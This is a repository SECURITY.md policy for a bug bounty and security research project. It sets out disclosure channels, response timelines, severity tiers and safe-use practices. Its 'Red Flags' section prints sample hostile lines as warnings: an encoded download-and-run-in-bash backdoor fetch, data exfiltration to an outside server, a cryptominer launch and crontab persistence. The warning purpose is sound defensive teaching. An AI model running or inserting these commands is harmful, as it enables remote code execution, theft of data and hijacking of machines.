# Security Policy

[![Security Policy](https://img.shields.io/badge/Security-Policy-blue)](SECURITY.md)
[![Responsible Disclosure](https://img.shields.io/badge/Responsible-Disclosure-green)](SECURITY.md)

## 🛡️ Our Commitment to Security

The security of this repository and its users is our highest priority. We are committed to maintaining a secure environment for sharing security research, tools, and methodologies while protecting against misuse.

## 📢 Supported Versions

| Version | Supported          |
| ------- | ------------------ |
| Latest commit (main branch) | ✅ Active support |
| Previous releases | ⚠️ Limited support |
| Archived versions | ❌ Unsupported |

**Note:** Only the most recent version of tools and scripts receives security updates. Always pull the latest changes before use.

## 🚨 Reporting a Vulnerability

### For Vulnerabilities in THIS Repository

If you discover a security vulnerability within this repository (vulnerable code, exposed credentials, or other security issues):

**DO NOT OPEN A PUBLIC ISSUE** - This could expose the vulnerability to malicious actors.

Instead, follow our responsible disclosure process:

#### 📧 Reporting Methods (in order of preference)

1. **Email:** awjunaid@proton.me
   - Subject: `[SECURITY] Bug Bounty Repo - Brief Description`
   - Include PGP key if you require encrypted communication

2. **Signal/WhatsApp:** Available upon request for sensitive disclosures
   - Contact via email first to arrange secure channel

3. **Discord:** DM `@awjunaid` (only for non-critical issues)

#### 📋 What to Include in Your Report


- Description of the vulnerability
- Steps to reproduce (proof of concept)
- Affected files/components
- Potential impact
- Suggested fix (if any)
- Your contact information for follow-up

#### ⏱️ Response Timeline

| Stage | Expected Timeframe |
|-------|-------------------|
| Initial acknowledgment | Within 24-48 hours |
| Verification & assessment | Within 3-5 business days |
| Fix development | Based on severity |
| Public disclosure coordination | Coordinated with reporter |

#### 🎯 What to Expect

1. **Acknowledgment:** You'll receive confirmation within 48 hours
2. **Communication:** Regular updates on progress
3. **Credit:** Public acknowledgment (with your permission)
4. **Disclosure:** Coordinated disclosure timeline

### Severity Classification

| Severity | Description | Response Time |
|----------|-------------|---------------|
| **Critical** | Remote code execution, credential exposure, authentication bypass | < 24 hours |
| **High** | XSS, CSRF, SQLi in repository tools | < 48 hours |
| **Medium** | Information disclosure, misconfigurations | < 1 week |
| **Low** | Minor issues, typos in security docs | < 2 weeks |

## 🔒 Using This Repository Safely

### For Security Researchers

⚠️ **Important Safety Guidelines:**

```bash
# ALWAYS review code before execution
cat suspicious-script.sh  # Review first
./suspicious-script.sh    # Execute after review

# Use isolated environments
docker run -it --rm kali-linux /bin/bash
# OR
python3 -m venv isolated-env
source isolated-env/bin/activate

# Never run as root/sudo unless absolutely necessary
sudo python3 script.py  # ⚠️ AVOID THIS
python3 script.py       # ✅ PREFER THIS
```

### Best Practices

1. **Isolate Testing Environments**
   - Use VMs, containers, or dedicated testing machines
   - Never test on production systems
   - Maintain separate environments for different tools

2. **Verify Tool Sources**
   - Check file hashes when provided
   - Review code for suspicious patterns
   - Be cautious with obfuscated code

3. **Handle Payloads Carefully**
   - Treat all payloads as potentially dangerous
   - Use proper output encoding
   - Never use real credentials in examples

4. **Network Safety**
   - Use VPN when testing
   - Monitor outgoing connections
   - Be aware of callbacks/reverse shells

## 🚫 Security Anti-Patterns

### What NOT to Do

❌ **Never:**
- Run tools without understanding what they do
- Commit real API keys, tokens, or credentials
- Share active 0-days without coordination
- Use these tools against unauthorized targets
- Execute scripts with `curl | bash` patterns
- Store sensitive data in plaintext within the repo

### Red Flags in Scripts

Watch out for these suspicious patterns:

```python
# 🚨 SUSPICIOUS - Base64 encoded commands
os.system("echo d2dldCBodHRwOi8vbWFsaWNpb3VzLmNvbS9iYWNrZG9vci5zaCB8IGJhc2gK | base64 -d | bash")

# 🚨 SUSPICIOUS - Hidden data exfiltration
requests.post("http://unknown-server.com/collect", data=sensitive_info)

# 🚨 SUSPICIOUS - Cryptominers
subprocess.run(["./xmrig", "--url=pool.supportxmr.com"])

# 🚨 SUSPICIOUS - Unusual persistence
os.system("crontab -l | { cat; echo '* * * * * /tmp/backdoor'; } | crontab -")
```

## 📊 Vulnerability Disclosure Program

### Scope of This Repository's Security Policy

**IN SCOPE:**
- Vulnerabilities in tools/scripts within this repo
- Exposed secrets/credentials in commits
- Security misconfigurations in repo settings
- Vulnerable dependencies in documented tools

**OUT OF SCOPE:**
- Vulnerabilities in third-party tools we reference
- Issues requiring unlikely user interaction
- Missing security headers on GitHub Pages (if any)
- Vulnerabilities in forked repositories

### Public Disclosure Policy

We follow coordinated disclosure:

1. Report received via private channel
2. Verification and impact assessment
3. Fix developed and tested
4. **For critical issues:** Private notification to active users
5. Public disclosure with advisory
6. CVE request if applicable

### Bug Bounty

**This repository does NOT offer monetary rewards.** However, we provide:

- ✅ Public acknowledgment in Hall of Fame
- ✅ LinkedIn recommendation (upon request)
- ✅ Reference letter for significant findings
- ✅ Shoutout on social media channels
- ✅ Contributor status in repository

## 🔐 Security Features We Use

- **Branch Protection:** Main branch requires reviews
- **Secret Scanning:** GitHub's secret scanning enabled
- **Dependabot:** Automated dependency updates
- **CodeQL:** Static analysis security testing
- **2FA Required:** For all maintainers

## 📝 Reporting Misuse

If you discover someone using this repository's content for malicious purposes:

1. **Document** the misuse with evidence
2. **Contact** us at awjunaid@proton.me
3. **Subject:** `[MISUSE] Brief description`

We will:
- Investigate the report
- Take appropriate action (content removal, access revocation)
- Report to relevant platforms/programs if necessary
- Assist affected parties where possible


## 📚 Additional Resources

### Secure Development Guidelines

- [OWASP Secure Coding Practices](https://owasp.org/www-project-secure-coding-practices-quick-reference-guide/)
- [GitHub Security Best Practices](https://docs.github.com/en/code-security)
- [Python Security Best Practices](https://snyk.io/blog/python-security-best-practices-cheat-sheet/)
- [Bash Script Security](https://mywiki.wooledge.org/BashPitfalls)


## 📞 Contact

**Security Team Contact:**
- **Lead:** Abdul Wahab Junaid (@aw-junaid)
- **Email:** awjunaid@proton.me
- **Response Time:** < 24 hours for critical issues

<!-- 
⚠️ WARNING: Do not include sensitive details in this public template!
Use this only as a reference, then email awjunaid@proton.me
-->

